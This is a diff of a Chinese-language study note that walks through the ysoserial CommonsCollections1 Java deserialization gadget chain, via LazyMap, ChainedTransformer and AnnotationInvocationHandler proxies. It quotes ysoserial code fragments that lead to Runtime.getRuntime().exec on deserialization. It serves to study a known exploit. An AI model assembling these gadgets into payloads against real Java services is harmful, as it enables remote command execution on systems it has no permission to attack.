@@ -10,7 +10,6 @@ tags:
   - ysoserial
 description: CommonsCollections1
 ---
-
 ## 利用链全览 & 依赖
 
 ```
@@ -91,7 +90,7 @@ public Object get(Object key) {
 }
 ```
 
-如果 `map` 中的 `key` 尚未存在，则会执行：
+如果 `map` 中的 `key` 尚未存在（一个空的 `map` 就可以做到），则会执行：
 
 ```java
 factory.transform(key)
@@ -113,7 +112,23 @@ public interface Transformer {
 }
 ```
 
-来看 Payload 中链的构造：
+而 `factory` 的赋值可以通过 `decorate` 方法去调用构造方法传入：
+
+```java
+public static Map decorate(Map map, Transformer factory) {
+	return new LazyMap(map, factory);
+}
+
+protected LazyMap(Map map, Transformer factory) {
+	super(map);
+	if (factory == null) {
+		throw new IllegalArgumentException("Factory must not be null");
+	}
+	this.factory = factory;
+}
+```
+
+来看 ysoserial 中的对应部分：
 
 ```java
 // inert chain for setup
@@ -132,12 +147,18 @@ final Transformer[] transformers = new Transformer[] {
 				new Class[] { String.class }, execArgs),
 		new ConstantTransformer(1) };
 
+final Map innerMap = new HashMap();
+
+final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+
 [snip]
+
 Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
+
 [snip]
 ```
 
-这里作者先设置了一个无害的链（为了防止在本地生成 Payload（即序列化）的时候就触发了利用链，从而对自己的电脑造成危害）：
+这里作者先设置了一个无害的链（为了防止在本地生成 Payload 的时候就触发了利用链）：
 
 ```java
 // inert chain for setup
@@ -145,7 +166,7 @@ final Transformer transformerChain = new ChainedTransformer(
 	    new Transformer[]{ new ConstantTransformer(1) });
 ```
 
-随后构造了真实有效的链：
+随后构造了一个全都是 Transformer 实例的数组 `transformers`：
 
 ```java
 // real chain for after setup
@@ -162,7 +183,15 @@ final Transformer[] transformers = new Transformer[] {
 		new ConstantTransformer(1) };
 ```
 
-接着通过反射，找到 `transformerChain` 中的 `iTransformers` 属性，并将其赋值为 `transformers`（前面构造好的链条）：
+接着，作者将 LazyMap 中的 `factory` 属性赋值为 `transformerChain`：
+
+```java
+final Map innerMap = new HashMap();
+
+final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+```
+
+接着通过反射，找到 `transformerChain` 中的 `iTransformers` 属性，并将其赋值为 `transformers`：
 
 ```java
 Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
@@ -188,6 +217,18 @@ public static void setFieldValue(final Object obj, final String fieldName, final
 }	
 ```
 
+如果此时，通过某种方式，对 `LazyMap.get()` 发起了调用，由于之前配置的 `innerMap` 是空的，按之前说的，会执行：
+
+```java
+Object value = factory.transform(key);
+```
+
+切换成赋值后的视角，也就是执行：
+
+```java
+transformerChain.transform(key);
+```
+
 来看 `ChainedTransformer` 中的 `transform` 方法：
 
 ```java
@@ -200,11 +241,9 @@ public Object transform(Object object) {
 }
 ```
 
-它会遍历 `iTransformers` 数组中的所有对象，并执行这些对象的 `transform` 方法。
+它会遍历 `iTransformers` 数组（已经被赋值为 `transformers`）中的所有对象，并执行这些对象的 `transform` 方法。
 
-而 `iTransformers` 被赋值成了那个真实有效的链条。
-
-一条条看，首先是：
+那么一条条来看 `transformers` 数组中的内容，首先是：
 
 ```java
 new ConstantTransformer(Runtime.class),
@@ -307,7 +346,7 @@ Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec(execArgs)
 Runtime.getRuntime().exec()
 ```
 
-此时其实已经执行了攻击者所提供的命令，但作者还在后面安排了一个：
+执行到这的时候，攻击者已经达成了命令执行的目的，但是作者还在后面安排了一个：
 
 ```java
 new ConstantTransformer(1)
@@ -347,19 +386,17 @@ ClassCastException: java.lang.Integer cannot be cast to java.util.Set
 
 ### AnnotationInvocationHandler
 
-接下来就是想着如何通过反序列化触发 `LazyMap.get()`：
+前面能成功执行命令的前提：触发了 `LazyMap.get()` 调用。
+
+因此，接下来就是想着如何通过反序列化去自动调用 `LazyMap.get()`，来看 ysoserial 中对应的代码：
 
 ```java
-final Map innerMap = new HashMap();
-
-final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-
 final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
 
 final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
 ```
 
-ysoserial 针对：
+ysoserial 项目针对：
 
 - 创建动态代理（设置 `AnnotationInvocationHandler` 为处理器）
 - 实例化 `AnnotationInvocationHandler`
@@ -422,6 +459,8 @@ createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
 
 会创建一个动态代理，并由上述 `AnnotationInvocationHandler` 对象作为处理器。
 
+由于后面还会出现一个 `AnnotationInvocationHandler` 对象，为了避免混淆，这里标记其为 A。
+
 这个动态代理对象会赋值给 `mapProxy`。
 
 #### `createMemoizedInvocationHandler`
@@ -434,7 +473,7 @@ final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapPro
 
 这个方法上面讲过，这里不赘述。
 
-得到的效果是，动态代理对象 `mapProxy` 作为 `AnnotationInvocationHandler` 构造方法的参数，使得属性 `memberValues` 被赋值为 `mapProxy`。
+得到的效果是，动态代理对象 `mapProxy` 作为 `AnnotationInvocationHandler` 构造方法的参数，使得属性 `memberValues` 被赋值为 `mapProxy`。此时得到了第二个 `AnnotationInvocationHandler` 对象 `handler` 记为 B。
 
 #### `readObject`
 
@@ -454,19 +493,25 @@ private void readObject(java.io.ObjectInputStream s)
 }
 ```
 
-其中的 `streamVals.entrySet()`，等价于：
+根据代码，其中的 `streamVals.entrySet()`，等价于：
 
-```
-memberValues.entrySet() → mapProxy.entrySet()
+```java
+memberValues.entrySet()
 ```
 
-而 `mapProxy` 是一个动态代理对象，对其的方法调用，最终都会回归到其处理器的 `invoke()` 方法上：
+在 `AnnotationInvocationHandler`（B）中，又可以写成：
+
+```java
+mapProxy.entrySet()
+```
+
+而 `mapProxy` 是一个动态代理对象，对其的方法调用，最终都会回归到其处理器（`AnnotationInvocationHandler`（A））的 `invoke()` 方法上（这个在[[前置知识|这篇笔记]]中有详细讲解）：
 
 ```java
 AnnotationInvocationHandler.invoke()
 ```
 
-**注意**，此时已经来到第一个 `AnnotationInvocationHandler`，即此时的 `memberValues` 是 `LazyMap` 而不是 `mapProxy`。
+**注意**，此时已经来到 `AnnotationInvocationHandler`（A），即此时的 `memberValues` 是 `LazyMap` 而不是 `mapProxy`。
 
 ```java hl:4
 public Object invoke(Object proxy, Method method, Object[] args) {
@@ -483,7 +528,7 @@ public Object invoke(Object proxy, Method method, Object[] args) {
 LazyMap.get(member)
 ```
 
-这就成功了。
+这就达成目的了。
 
 ## 参考文章
 
